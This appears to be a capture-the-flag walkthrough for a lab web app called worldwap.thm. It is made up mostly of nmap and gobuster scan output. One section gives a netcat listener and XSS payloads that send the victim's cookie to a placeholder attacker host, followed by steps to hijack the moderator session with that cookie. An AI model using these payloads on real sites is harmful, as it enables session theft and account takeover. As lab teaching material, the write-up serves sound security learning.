# TASK Port

```
nmap 10.82.172.180 -sV -Pn -p- -T4
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-06 10:33 +0800
Nmap scan report for 10.82.172.180
Host is up (0.26s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
8081/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

---

# TASK Directory of worldwap.thm

```
root@ip-10-81-71-220:~# gobuster dir -u 'http://worldwap.thm/' -w /usr/share/wordlists/dirb/big.txt -x .php,.txt,.jsp,.json,.asp,.js  -b 403-500
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://worldwap.thm/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   484,498,415,421,427,430,466,403,439,444,453,477,411,417,449,462,475,422,460,480,489,408,420,424,429,445,418,425,428,404,406,437,467,440,472,431,481,432,476,471,483,454,463,468,450,465,487,416,448,456,451,497,499,455,491,457,458,469,412,413,414,426,441,442,493,410,464,474,433,452,470,485,494,496,459,479,409,495,500,436,419,423,435,434,438,473,478,405,407,488,492,490,447,461,482,443,446,486
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,jsp,json,asp,js
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/api                  (Status: 301) [Size: 310] [--> http://worldwap.thm/api/]
/index.php            (Status: 302) [Size: 0] [--> /public/html/]
/javascript           (Status: 301) [Size: 317] [--> http://worldwap.thm/javascript/]
/logs.txt             (Status: 200) [Size: 0]
/phpmyadmin           (Status: 301) [Size: 317] [--> http://worldwap.thm/phpmyadmin/]
/public               (Status: 301) [Size: 313] [--> http://worldwap.thm/public/]
Progress: 143283 / 143290 (100.00%)
===============================================================
Finished
===============================================================
```

```
root@ip-10-81-71-220:~# gobuster dir -u 'http://worldwap.thm/public/' -w /usr/share/wordlists/dirb/big.txt -x .php,.txt,.jsp,.json,.asp,.js  -b 403-500
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://worldwap.thm/public/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   407,409,437,447,475,493,420,486,491,403,430,441,466,440,464,412,421,439,470,471,429,459,483,434,444,460,480,418,432,438,455,458,469,417,424,415,423,445,468,482,494,410,442,474,497,426,408,411,414,462,496,422,428,449,495,457,489,499,478,487,446,479,490,406,427,431,453,461,476,477,405,463,485,416,435,451,465,467,488,492,413,436,443,472,484,448,450,456,452,454,498,433,473,481,425,500,419,404
[+] User Agent:              gobuster/3.6
[+] Extensions:              json,asp,js,php,txt,jsp
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/css                  (Status: 301) [Size: 317] [--> http://worldwap.thm/public/css/]
/html                 (Status: 301) [Size: 318] [--> http://worldwap.thm/public/html/]
/images               (Status: 301) [Size: 320] [--> http://worldwap.thm/public/images/]
/js                   (Status: 301) [Size: 316] [--> http://worldwap.thm/public/js/]
Progress: 143283 / 143290 (100.00%)
===============================================================
Finished
===============================================================
```

```
root@ip-10-81-71-220:~# gobuster dir -u 'http://worldwap.thm/public/html/' -w /usr/share/wordlists/dirb/big.txt -x .php,.txt,.jsp,.json,.asp,.js  -b 403-500
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://worldwap.thm/public/html/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   406,474,415,420,405,414,452,437,453,470,412,495,443,458,463,429,430,438,449,490,476,483,426,447,492,431,466,478,436,465,410,444,461,482,488,435,500,407,456,460,446,472,473,409,481,475,493,432,439,469,455,418,419,440,403,497,451,485,411,433,457,477,498,413,459,425,441,404,421,423,489,496,454,468,486,494,462,499,445,471,487,464,467,480,408,417,491,424,434,442,448,428,450,416,422,427,479,484
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,jsp,json,asp,js
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 1797]
/login.php            (Status: 200) [Size: 1785]
/logout.php           (Status: 200) [Size: 154]
/register.php         (Status: 200) [Size: 2188]
Progress: 143283 / 143290 (100.00%)
===============================================================
Finished
===============================================================
```

```
root@ip-10-81-71-220:~# gobuster dir -u 'http://worldwap.thm/api/' -w /usr/share/wordlists/dirb/big.txt -x .php,.txt,.jsp,.json,.asp,.js  -b 403-500
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://worldwap.thm/api/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   419,435,465,472,474,475,452,467,492,427,444,471,481,418,443,461,425,438,450,454,495,406,415,430,455,488,410,412,428,420,429,469,476,432,442,482,496,413,453,459,493,458,460,479,431,434,445,463,490,422,446,468,494,405,421,426,477,499,403,485,411,414,416,433,417,441,448,491,449,451,478,486,424,457,473,480,483,404,470,407,436,439,408,423,456,464,447,462,466,484,489,500,437,440,487,498,409,497
[+] User Agent:              gobuster/3.6
[+] Extensions:              jsp,json,asp,js,php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/add_post.php         (Status: 200) [Size: 34]
/config.php           (Status: 200) [Size: 0]
/index.php            (Status: 200) [Size: 0]
/login.php            (Status: 200) [Size: 34]
/logout.php           (Status: 200) [Size: 42]
/mod.php              (Status: 200) [Size: 25]
/posts.php            (Status: 200) [Size: 25]
/register.php         (Status: 200) [Size: 48]
/setup.php            (Status: 200) [Size: 16]
Progress: 143283 / 143290 (100.00%)
===============================================================
Finished
===============================================================
```

---

# TASK

1. Observe that httponly header is not set. That means client-side can access cookies.

2. Create listener
   ```
   nc -lnvp 9001
   ```

3. Submit payload as XSS
   ```
   <img src=x onerror="window.location='http://ATTACKER:PORT/?message=hello';">
   <script>window.location='http://ATTACKER:PORT/?'+document.cookie;</script>
   ```

4. Receive cookie

5. Replace cookie and reload to access moderator account.

6. Found new host login.worldwap.thm

---

# TASK Directory of login.worldwap.thm

```
root@ip-10-82-122-108:~# gobuster dir -u 'http://login.worldwap.thm/' -w /usr/share/wordlists/dirb/big.txt -x .php,.txt,.jsp,.json,.asp,.js  -b 403-500
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://login.worldwap.thm/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   450,424,439,441,454,466,490,442,476,478,421,416,425,467,448,418,459,464,471,405,460,488,446,456,485,494,426,436,443,496,444,470,434,468,473,497,412,429,461,486,500,410,431,475,483,489,458,408,433,455,440,452,487,435,432,423,437,484,414,415,420,481,492,413,493,445,477,428,480,498,479,407,406,447,491,495,430,419,427,451,457,411,465,463,469,472,474,482,499,404,462,438,409,449,453,422,417,403
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,jsp,json,asp,js
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 325] [--> http://login.worldwap.thm/assets/]
/block.php            (Status: 200) [Size: 15]
/change_password.php  (Status: 302) [Size: 4] [--> login.php]
/chat.php             (Status: 302) [Size: 0] [--> login.php]
/clear.php            (Status: 200) [Size: 4]
/db.php               (Status: 200) [Size: 0]
/index.php            (Status: 200) [Size: 70]
/javascript           (Status: 301) [Size: 329] [--> http://login.worldwap.thm/javascript/]
/login.php            (Status: 200) [Size: 3108]
/logout.php           (Status: 302) [Size: 0] [--> login.php]
/logs.txt             (Status: 200) [Size: 0]
/phpmyadmin           (Status: 301) [Size: 329] [--> http://login.worldwap.thm/phpmyadmin/]
/profile.php          (Status: 302) [Size: 0] [--> login.php]
/setup.php            (Status: 200) [Size: 149]
Progress: 143283 / 143290 (100.00%)
===============================================================
Finished
===============================================================
```

---

# TASK

Moderator flag found at login.worldwap.thm.index.php

---

# TASK Look for python extension file too

```
root@ip-10-82-122-108:~# gobuster dir -u 'http://login.worldwap.thm/' -w /usr/share/wordlists/dirb/big.txt -x .php,.txt,.jsp,.json,.asp,.js,.py  -b 303-500
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://login.worldwap.thm/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   352,495,342,360,371,388,471,306,336,316,318,354,378,379,424,491,413,416,482,500,412,420,442,462,484,314,466,374,477,321,383,469,494,497,339,430,447,472,312,329,367,343,385,393,337,376,460,390,398,459,461,404,451,304,372,429,479,415,305,418,465,311,433,453,333,345,346,369,375,428,435,341,350,365,389,468,488,426,456,340,411,387,392,364,480,324,386,463,310,408,481,403,307,464,344,381,423,489,353,380,496,309,467,475,478,330,422,458,486,348,391,400,431,474,313,317,335,443,399,419,373,436,332,434,359,368,473,323,394,452,409,370,446,327,455,499,322,331,361,366,407,449,319,349,384,406,432,334,397,402,444,448,470,326,437,439,414,377,401,410,441,450,315,382,395,417,457,476,490,308,347,362,498,303,351,338,396,405,454,320,358,421,438,363,440,445,493,355,356,357,427,483,485,487,492,325,328,425
[+] User Agent:              gobuster/3.6
[+] Extensions:              jsp,json,asp,js,py,php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin.py             (Status: 200) [Size: 5537]
/assets               (Status: 301) [Size: 325] [--> http://login.worldwap.thm/assets/]
/block.php            (Status: 200) [Size: 15]
/change_password.php  (Status: 302) [Size: 4] [--> login.php]
/chat.php             (Status: 302) [Size: 0] [--> login.php]
/clear.php            (Status: 200) [Size: 4]
/db.php               (Status: 200) [Size: 0]
/index.php            (Status: 200) [Size: 70]
/javascript           (Status: 301) [Size: 329] [--> http://login.worldwap.thm/javascript/]
/login.php            (Status: 200) [Size: 3108]
/logout.php           (Status: 302) [Size: 0] [--> login.php]
/logs.txt             (Status: 200) [Size: 0]
/phpmyadmin           (Status: 301) [Size: 329] [--> http://login.worldwap.thm/phpmyadmin/]
/profile.php          (Status: 302) [Size: 0] [--> login.php]
/setup.php            (Status: 200) [Size: 149]
/test.py              (Status: 200) [Size: 687]
Progress: 163752 / 163760 (100.00%)
===============================================================
Finished
===============================================================
```

---

# TASK

admin account credential found in admin.py
Login to get admin flag

---

# Appendix